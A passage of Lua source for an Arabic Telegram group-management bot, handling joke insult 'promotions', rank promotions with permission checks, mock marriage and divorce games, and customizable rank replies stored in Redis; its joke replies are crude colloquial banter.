local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• دا مولود كده ومحطوط عندنا من زمان 😂 😂 ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم رفعه متوحد  كنت شاكك فيه انو سايكو😂  ").Reply,"md",true)  
end
end
if TextMsg == "جلب" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."klb:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• دا مولود كده ومحطوط عندنا من زمان بيشمشم علي اي بنت 😂 😂 ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."klb:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم رفعه جلب خليه يجي ياخد عضمه😂  ").Reply,"md",true)  
end
end
if TextMsg == "حمار" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."mar:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• نزلناه من زمان وفكينا الكارو 😂 😂 ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."mar:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم رفعه حمار خليه يجي نركبلو عربية كرو😂  ").Reply,"md",true)  
end
end
if TextMsg == "نثيه" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."smb:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• نزلناه من زمان واخد كورسات رجوله 😂 😂 ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."smb:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم رفعه نثيه في الكروب عقبال ميبقا زي النسوان الي تعبينو 😂  ").Reply,"md",true)  
end
end
if TextMsg == "قرد" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."2rd:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• نزلناه من زمان من ع الشجره 😂 😂 ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."2rd:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم رفعه قرد في الكروب تعال خدلك موزه  😂  ").Reply,"md",true)  
end
end
if TextMsg == "فرخي" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."3ra:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم رقعه فرخك ربيه كويس بقا 😂 ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."3ra:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم رفعه فرخك هنا 😂.").Reply,"md",true)  
end
end
if TextMsg == "غبي" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."8by:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• هو كده كده محطوط ف قايمة الاغبية  😂 😂 ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."8by:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم رفعه غبي المجموعة  😂  ").Reply,"md",true)  
end
end
end
if text and text:match('^رفع (.*) (%d+)$') then
local UserId = {text:match('^رفع (.*) (%d+)$')}
local UserInfo = LuaTele.getUser(UserId[2])
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if UserId[1] == 'مطور ثانوي' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Devss:Groups",UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Devss:Groups",UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته مطور ثانوي").Reply,"md",true)  
end
end
if UserId[1] == 'مطور' then
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Dev:Groups",UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته مطور مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Dev:Groups",UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته مطور ").Reply,"md",true)  
end
end
if UserId[1] == "مالك" then
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Owners:Group"..msg_chat_id,UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته مالك مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Owners:Group"..msg_chat_id,UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته مالك ").Reply,"md",true)  
end
end
if UserId[1] == "منشئ اساسي" then
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Supcreator:Group"..msg_chat_id,UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته منشئ اساسي مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Supcreator:Group"..msg_chat_id,UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته منشئ اساسي ").Reply,"md",true)  
end
end
if UserId[1] == "منشئ" then
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Creator:Group"..msg_chat_id,UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته منشئ  مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Creator:Group"..msg_chat_id,UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته منشئ  ").Reply,"md",true)  
end
end
if UserId[1] == "مدير" then
if not msg.Creator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(5)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Manger:Group"..msg_chat_id,UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته مدير  مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Manger:Group"..msg_chat_id,UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته مدير  ").Reply,"md",true)  
end
end
if UserId[1] == "ادمن" then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:SetId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الرفع) من قبل المنشئين","md",true)
end 
if Redis:sismember(LaRiCa.."Admin:Group"..msg_chat_id,UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته ادمن  مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Admin:Group"..msg_chat_id,UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته ادمن  ").Reply,"md",true)  
end
end
if UserId[1] == "مميز" then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:SetId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الرفع) من قبل المنشئين","md",true)
end 
if Redis:sismember(LaRiCa.."Special:Group"..msg_chat_id,UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته مميز  مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Special:Group"..msg_chat_id,UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم ترقيته مميز  ").Reply,"md",true)  
end
end
end
---تتزوجيني
if text == "تتزوجيني" or text == "تزوجني" then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local Jabwa = LuaTele.getUser(Message_Reply.sender.user_id)
local bain = LuaTele.getUser(msg.sender.user_id)
if Jabwa.first_name then
LaRiCausername = '*طلب : *['..bain.first_name..'](tg://user?id='..bain.id..')*\nالزواج من : *['..Jabwa.first_name..'](tg://user?id='..Jabwa.id..')*\nهل العروسه مواقفه علي هذا\n*'
else
LaRiCausername = 'لا يوجد'
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '• موافقه', data = Message_Reply.sender.user_id..'/zog1'},{text = '• مموافقه', data = Message_Reply.sender.user_id..'/zog2'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,LaRiCausername,"md",false, false, false, false, reply_markup)
end
if text == "زواج" or text == "رفع زوجتي" or text == "رفع زوجي" and msg.reply_to_message_id ~= 0 then
  local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
  local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
  if tonumber(Message_Reply.sender.user_id) == tonumber(msg.sender.user_id) then
    return LuaTele.sendText(msg_chat_id,msg_id,"انت اهبل يبني عاوز تتجوز نفسك ؟ هتتكاثر ذاتيا ولا اي ؟!!","md",true)  
  end
  if tonumber(Message_Reply.sender.user_id) == tonumber(LaRiCa) then
    return LuaTele.sendText(msg_chat_id,msg_id,"ابعد عني يحيحان ","md",true)  
  end
  if Redis:sismember(LaRiCa..msg_chat_id.."zwgat:",Message_Reply.sender.user_id) then
local rd_mtzwga = {"يله حبيبي طفي الضوه وخل نتوكل"}
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,rd_mtzwga[math.random(#rd_mtzwga)]).Reply,"md",true)  
else local rd_zwag = {"الزواج تم حبيبي طب بزودك"}
    if Redis:sismember(LaRiCa..msg_chat_id.."mutlqat:",Message_Reply.sender.user_id) then 
    Redis:srem(LaRiCa..msg_chat_id.."mutlqat:",Message_Reply.sender.user_id)
    end
    Redis:sadd(LaRiCa..msg_chat_id.."zwgat:",Message_Reply.sender.user_id) 
    return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,rd_zwag[math.random(#rd_zwag)]).Reply,"md",true)  
    end
end
if text == "تاك للزوجات" or text == "الزوجات" then
  local zwgat_list = Redis:smembers(LaRiCa..msg_chat_id.."zwgat:")
  if #zwgat_list == 0 then return LuaTele.sendText(msg_chat_id,msg_id,'• لايوجد زوجات',"md",true) 
  end 
local zwga_list = "• عدد الزوجات : "..#zwgat_list.."\n• الزوجات :\nٴ— — — — — — — — — —\n"
for k, v in pairs(zwgat_list) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
zwga_list = zwga_list.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
zwga_list = zwga_list.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
return LuaTele.sendText(msg_chat_id,msg_id,zwga_list,"md",true) 
end
if text == "طلاق" or text == "تنزيل زوجتي" or text == "تنزيل زوجي" and msg.reply_to_message_id ~= 0 then
  local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
  local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
  if tonumber(Message_Reply.sender.user_id) == tonumber(msg.sender.user_id) then
    return LuaTele.sendText(msg_chat_id,msg_id,"احا هو انت كنت اتجوزت نفسك عشان تطلق","md",true)  
  end
  if tonumber(Message_Reply.sender.user_id) == tonumber(LaRiCa) then
    return LuaTele.sendText(msg_chat_id,msg_id,"هو احنا كنا اتجوزنا يروح خالتك عشان نطلق","md",true)  
  end
  if Redis:sismember(LaRiCa..msg_chat_id.."zwgat:",Message_Reply.sender.user_id) then
    Redis:srem(LaRiCa..msg_chat_id.."zwgat:",Message_Reply.sender.user_id)
    Redis:sadd(LaRiCa..msg_chat_id.."mutlqat:",Message_Reply.sender.user_id) 
    local rd_tmtlaq = {"تم طلاقكم للاسف","تم الطلاق بلص ام عبير عاوزه تعرف اتطلقتو لي ؟","تم الطلاق عشان المعلم مبيعرفش","تم الطلاق عشان في سوسه دخلت وسطهم","تم الطلاق بلص دا رقمي عشان لو حبيتي نتكلم باحترام 01234..."}
    return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,rd_tmtlaq[math.random(#rd_tmtlaq)]).Reply,"md",true)  
    else local rd_tlaq = {"مكنتش اتجوزت عشان تطلق اصلا","بايره محدش اتجوزها","محدش عبرها قبل كدا اسسن"}
    return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,rd_tlaq[math.random(#rd_tlaq)]).Reply,"md",true)  
    end
end
if text == "تاك للمطلقات" or text == "المطلقات" then
  local mutlqat_list = Redis:smembers(LaRiCa..msg_chat_id.."mutlqat:")
  if #mutlqat_list == 0 then 
    return LuaTele.sendText(msg_chat_id,msg_id,'• لايوجد مطلقات',"md",true) 
  end 
  local mutlqa_list = "• عدد المطلقات : "..#mutlqat_list.."\n• المطلقات :\nٴ— — — — — — — — — —\n"
for k, v in pairs(mutlqat_list) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
mutlqa_list = mutlqa_list.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
mutlqa_list = mutlqa_list.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
  end
  end
  return LuaTele.sendText(msg_chat_id,msg_id,mutlqa_list,"md",true) 
end

if text and text:match("^تغيير رد المطور (.*)$") then
local Teext = text:match("^تغيير رد المطور (.*)$") 
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
Redis:set(LaRiCa.."Developer:Bot:Reply"..msg.chat_id,Teext)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تغيير رد المطور الى :"..Teext)
elseif text and text:match("^تغيير رد المنشئ الاساسي (.*)$") then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
local Teext = text:match("^تغيير رد المنشئ الاساسي (.*)$") 
Redis:set(LaRiCa.."President:Group:Reply"..msg.chat_id,Teext)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تغيير رد المنشئ الاساسي الى :"..Teext)
elseif text and text:match("^تغيير رد المنشئ (.*)$") then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
local Teext = text:match("^تغيير رد المنشئ (.*)$") 
Redis:set(LaRiCa.."Constructor:Group:Reply"..msg.chat_id,Teext)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تغيير رد المنشئ الى :"..Teext)
elseif text and text:match("^تغيير رد المالك (.*)$") then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
local Teext = text:match("^تغيير رد المالك (.*)$") 
Redis:set(LaRiCa.."PresidentQ:Group:Reply"..msg.chat_id,Teext)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تغيير رد المالك الى :"..Teext)
elseif text and text:match("^تغيير رد المدير (.*)$") then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
local Teext = text:match("^تغيير رد المدير (.*)$") 
Redis:set(LaRiCa.."Manager:Group:Reply"..msg.chat_id,Teext) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تغيير رد المدير الى :"..Teext)
elseif text and text:match("^تغيير رد الادمن (.*)$") then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
local Teext = text:match("^تغيير رد الادمن (.*)$") 
Redis:set(LaRiCa.."Admin:Group:Reply"..msg.chat_id,Teext)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تغيير رد الادمن الى :"..Teext)
elseif text and text:match("^تغيير رد المميز (.*)$") then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
local Teext = text:match("^تغيير رد المميز (.*)$") 
Redis:set(LaRiCa.."Vip:Group:Reply"..msg.chat_id,Teext)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تغيير رد المميز الى :"..Teext)
elseif text and text:match("^تغيير رد العضو (.*)$") then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
local Teext = text:match("^تغيير رد العضو (.*)$") 
Redis:set(LaRiCa.."Mempar:Group:Reply"..msg.chat_id,Teext)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تغيير رد العضو الى :"..Teext)
elseif text == 'حذف رد المطور' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
Redis:del(LaRiCa.."Developer:Bot:Reply"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حدف رد المطور")
elseif text == 'حذف رد المنشئ الاساسي' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
Redis:del(LaRiCa.."President:Group:Reply"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف رد المنشئ الاساسي ")
elseif text == 'حذف رد المالك' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
Redis:del(LaRiCa.."PresidentQ:Group:Reply"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف رد المالك ")
elseif text == 'حذف رد المنشئ' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
Redis:del(LaRiCa.."Constructor:Group:Reply"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف رد المنشئ ")
elseif text == 'حذف رد المدير' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
Redis:del(LaRiCa.."Manager:Group:Reply"..msg.chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف رد المدير ")
elseif text == 'حذف رد الادمن' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
Redis:del(LaRiCa.."Admin:Group:Reply"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف رد الادمن ")
elseif text == 'حذف رد المميز' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
Redis:del(LaRiCa.."Vip:Group:Reply"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف رد المميز")
elseif text == 'حذف رد العضو' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
Redis:del(LaRiCa.."Mempar:Group:Reply"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف رد العضو")
end
if text == 'المطورين الثانويين' or text == 'المطورين الثانوين' or text == 'المطورين الثانويين •' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Devss:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مطورين حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه مطورين الثانويين \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المطورين الثانويين', data = msg.sender.user_id..'/Devss'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المطورين' or text == 'المطورين •' then
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Dev:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مطورين حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه مطورين البوت \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
